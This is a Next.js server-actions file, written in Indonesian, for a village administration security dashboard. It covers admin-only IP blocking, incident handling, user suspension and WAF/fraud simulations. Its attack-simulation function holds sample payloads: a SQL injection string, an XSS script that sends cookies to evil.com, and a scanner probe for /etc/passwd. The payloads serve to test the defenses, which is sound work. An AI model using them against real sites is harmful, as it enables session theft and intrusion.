"use server";

import { getServerSession } from "next-auth";
import { authOptions } from "@/lib/auth";
import { 
  PROJECT_TECH_NODES, 
  getSecurityIncidents, 
  getBlacklistedIps, 
  addToBlacklist, 
  removeFromBlacklist,
  scanRequestWithCppWaf,
  analyzeUserBehaviorWithPython,
  consumeUserWarning,
  dispatchUserWarning,
  updateIncidentStatus,
  recordIncident
} from "@/lib/cyberSecurityBridge";
import prisma from "@/lib/prisma";
import { revalidatePath } from "next/cache";

export async function getCyberSecurityOverview() {
  const session = await getServerSession(authOptions);
  if (!session?.user || (session.user as any).role !== "ADMIN_MASTER") {
    throw new Error("Akses terbatas khusus Super Administrator.");
  }

  const incidents = getSecurityIncidents();
  const blacklistedIps = getBlacklistedIps();

  // Hitung ancaman per node
  const nodes = PROJECT_TECH_NODES.map(node => {
    const nodeIncidents = incidents.filter(inc => 
      inc.targetNode.toLowerCase().includes(node.name.toLowerCase()) ||
      inc.targetNode.toLowerCase().includes(node.id.toLowerCase())
    );
    return {
      ...node,
      threatCount: nodeIncidents.length,
      status: nodeIncidents.some(i => i.status === "BLOCKED") 
        ? "THREAT_DEFENDED" as const
        : nodeIncidents.some(i => i.status === "WARNING") 
        ? "WARNING" as const 
        : "SECURED" as const
    };
  });

  const totalBlocked = blacklistedIps.length;
  const criticalThreats = incidents.filter(i => i.severity === "CRITICAL").length;
  const internalWarnings = incidents.filter(i => i.sourceType === "INTERNAL_FRAUD").length;

  return {
    nodes,
    incidents,
    blacklistedIps,
    metrics: {
      totalNodes: nodes.length,
      activeProtectedNodes: nodes.length,
      totalBlocked,
      criticalThreats,
      internalWarnings,
      sentinelStatus: "ACTIVE_24_7",
      lastScanTime: new Date().toISOString()
    }
  };
}

export async function blockIpAction(ip: string, reason: string) {
  const session = await getServerSession(authOptions);
  if (!session?.user || (session.user as any).role !== "ADMIN_MASTER") {
    throw new Error("Unauthorized.");
  }

  addToBlacklist(ip, reason || "Manual block by Super Admin");
  revalidatePath("/master-admin/keamanan");
  return { success: true, message: `IP ${ip} berhasil diblokade.` };
}

export async function unblockIpAction(ip: string) {
  const session = await getServerSession(authOptions);
  if (!session?.user || (session.user as any).role !== "ADMIN_MASTER") {
    throw new Error("Unauthorized.");
  }

  removeFromBlacklist(ip);
  revalidatePath("/master-admin/keamanan");
  return { success: true, message: `IP ${ip} berhasil dibuka dari blokir.` };
}

/**
 * Uji Coba Langsung Simulasi Serangan Siber (Membuktikan Eksekusi C++ WAF)
 */
export async function simulateExternalAttackAction(vector: "SQLI" | "XSS" | "SCANNER") {
  const session = await getServerSession(authOptions);
  if (!session?.user || (session.user as any).role !== "ADMIN_MASTER") {
    throw new Error("Unauthorized.");
  }

  const mockIp = `198.51.100.${Math.floor(Math.random() * 200 + 10)}`;
  let path = "/api/data/warga";
  let payload = "";
  let ua = "Mozilla/5.0";

  if (vector === "SQLI") {
    payload = "' OR '1'='1' UNION SELECT * FROM users--";
    ua = "sqlmap/1.5.2#stable";
  } else if (vector === "XSS") {
    payload = "<script>document.location='http://evil.com/?cookie='+document.cookie</script>";
  } else {
    ua = "nikto/2.1.6 Automated Vulnerability Harvester";
    path = "/admin/etc/passwd";
  }

  const result = await scanRequestWithCppWaf(mockIp, path, payload, ua);
  revalidatePath("/master-admin/keamanan");
  return result;
}

/**
 * Uji Coba Langsung Simulasi Kecurangan Internal (Membuktikan Eksekusi Python Sentinel)
 */
export async function simulateInternalFraudAction(violationType: "IDOR_TERRITORY" | "FINANCIAL_TAMPERING" | "BOT_SPAM") {
  const session = await getServerSession(authOptions);
  if (!session?.user || (session.user as any).role !== "ADMIN_MASTER") {
    throw new Error("Unauthorized.");
  }

  let testPayload: any = {
    userId: session.user.id || "test-user-01",
    userName: session.user.name || "Staf Pengguna Uji",
    role: "RT",
    action: "UPDATE_DATA_WARGA",
    targetResource: "Data Kependudukan",
    ip: "192.168.1.55",
    metadata: {
      userRt: "001",
      targetRt: "005" // Melanggar batas wilayah RT
    }
  };

  if (violationType === "FINANCIAL_TAMPERING") {
    testPayload = {
      userId: session.user.id || "test-user-02",
      userName: "Oknum Lapangan",
      role: "OPERATOR_DESA",
      action: "EDIT_ALOKASI_APBDES",
      targetResource: "C++ AHSP RAB Engine",
      ip: "192.168.1.99",
      metadata: {
        nominal: 250000000,
        isKadesVerified: false
      }
    };
  } else if (violationType === "BOT_SPAM") {
    testPayload = {
      userId: session.user.id || "test-user-03",
      userName: "User Bot Automation",
      role: "WARGA",
      action: "SUBMIT_PERMOHONAN_SURAT",
      targetResource: "Persuratan Desa Core",
      ip: "192.168.1.77",
      metadata: {
        requestFrequencyPerMin: 45 // Frekuensi abnormal > 30/menit
      }
    };
  }

  const result = await analyzeUserBehaviorWithPython(testPayload);
  revalidatePath("/master-admin/keamanan");
  return result;
}

/**
 * Cek apakah akun pengguna yang aktif menerima peringatan/alarm pelanggaran
 */
export async function checkActiveUserSecurityAlarm() {
  const session = await getServerSession(authOptions);
  if (!session?.user) return null;
  const user = session.user as any;
  const ids = [user.id, user.email, user.name].filter(Boolean);
  
  for (const id of ids) {
    const warning = consumeUserWarning(String(id));
    if (warning) return warning;
  }
  return null;
}

/**
 * Tindakan Khusus Admin: Menandai insiden telah diselesaikan
 */
export async function resolveIncidentAction(incidentId: string) {
  const session = await getServerSession(authOptions);
  if (!session?.user || (session.user as any).role !== "ADMIN_MASTER") {
    throw new Error("Unauthorized.");
  }

  const success = updateIncidentStatus(incidentId, "RESOLVED");
  revalidatePath("/master-admin/keamanan");
  return { success, message: "Status insiden berhasil diperbarui menjadi Terselesaikan (RESOLVED)." };
}

/**
 * Tindakan Khusus Admin: Nonaktifkan Akun Pelaku Pelanggaran Internal
 */
export async function suspendFraudulentUserAction(userIdOrIdentifier: string, reason: string) {
  const session = await getServerSession(authOptions);
  if (!session?.user || (session.user as any).role !== "ADMIN_MASTER") {
    throw new Error("Unauthorized.");
  }

  let user = await prisma.user.findUnique({ where: { id: userIdOrIdentifier } }).catch(() => null);
  if (!user) {
    user = await prisma.user.findFirst({
      where: {
        OR: [
          { email: userIdOrIdentifier },
          { fullName: { contains: userIdOrIdentifier, mode: "insensitive" } }
        ]
      }
    }).catch(() => null);
  }

  if (user) {
    await prisma.user.update({
      where: { id: user.id },
      data: { isActive: false }
    });

    const alertMsg = `AKUN ANDA TELAH DINONAKTIFKAN: Akses akun '${user.fullName}' telah dibekukan oleh Master Administrator. Alasan: "${reason}". Hubungi Kantor Desa Cimanggu I untuk klarifikasi dan verifikasi fisik.`;
    dispatchUserWarning(user.id, alertMsg);
    if (user.email) dispatchUserWarning(user.email, alertMsg);
    if (user.fullName) dispatchUserWarning(user.fullName, alertMsg);

    recordIncident({
      sourceType: "INTERNAL_FRAUD",
      ip: "127.0.0.1",
      userOrIdentifier: `${user.fullName} (${user.role})`,
      targetNode: "Auth & Identity Vault",
      attackVector: "ACCOUNT_SUSPENDED_BY_ADMIN",
      severity: "HIGH",
      status: "BLOCKED",
      detail: `Akun internal ${user.fullName} telah dibekukan/dinonaktifkan oleh Admin Master karena ${reason}`,
      userWarningDispatched: true
    });

    revalidatePath("/master-admin/keamanan");
    revalidatePath("/master-admin/pengguna-sistem");
    return { success: true, message: `Akun ${user.fullName} berhasil DINONAKTIFKAN secara permanen sampai ditinjau kembali.` };
  } else {
    // If user not in DB (mock or external), dispatch warning by identifier
    const alertMsg = `PERINGATAN SANKSI TEGAS: Pengguna '${userIdOrIdentifier}' telah dibekukan dari sistem desa karena pelanggaran: ${reason}`;
    dispatchUserWarning(userIdOrIdentifier, alertMsg);
    recordIncident({
      sourceType: "INTERNAL_FRAUD",
      ip: "127.0.0.1",
      userOrIdentifier: userIdOrIdentifier,
      targetNode: "Auth & Identity Vault",
      attackVector: "ACCOUNT_SUSPENDED_BY_ADMIN",
      severity: "HIGH",
      status: "BLOCKED",
      detail: `Identitas pengguna ${userIdOrIdentifier} ditandai dibekukan oleh Admin Master: ${reason}`,
      userWarningDispatched: true
    });
    revalidatePath("/master-admin/keamanan");
    return { success: true, message: `Peringatan penonaktifan telah dikirimkan ke '${userIdOrIdentifier}'.` };
  }
}

/**
 * Tindakan Khusus Admin: Kirim Peringatan / Alarm Kustom Langsung ke Layar Pengguna
 */
export async function sendDirectUserAlarmAction(targetUserOrId: string, customMessage: string) {
  const session = await getServerSession(authOptions);
  if (!session?.user || (session.user as any).role !== "ADMIN_MASTER") {
    throw new Error("Unauthorized.");
  }

  const formattedMsg = `PERINGATAN RESMI MASTER ADMINISTRATOR: ${customMessage}`;
  dispatchUserWarning(targetUserOrId, formattedMsg);

  recordIncident({
    sourceType: "RULE_VIOLATION",
    ip: "127.0.0.1",
    userOrIdentifier: targetUserOrId,
    targetNode: "Sentry Brain (Otak Kepala Keamanan)",
    attackVector: "DIRECT_ADMIN_DISCIPLINARY_WARNING",
    severity: "MEDIUM",
    status: "WARNING",
    detail: `Peringatan langsung diterbitkan oleh Admin Master kepada '${targetUserOrId}': ${customMessage}`,
    userWarningDispatched: true
  });

  revalidatePath("/master-admin/keamanan");
  return { success: true, message: `Alarm peringatan telah dikirimkan ke layar pengguna '${targetUserOrId}'.` };
}

/**
 * Polling Realtime Cepat untuk Pemantauan Tanpa Reload
 */
export async function getRealtimeCyberSecurityOverview() {
  return await getCyberSecurityOverview();
}
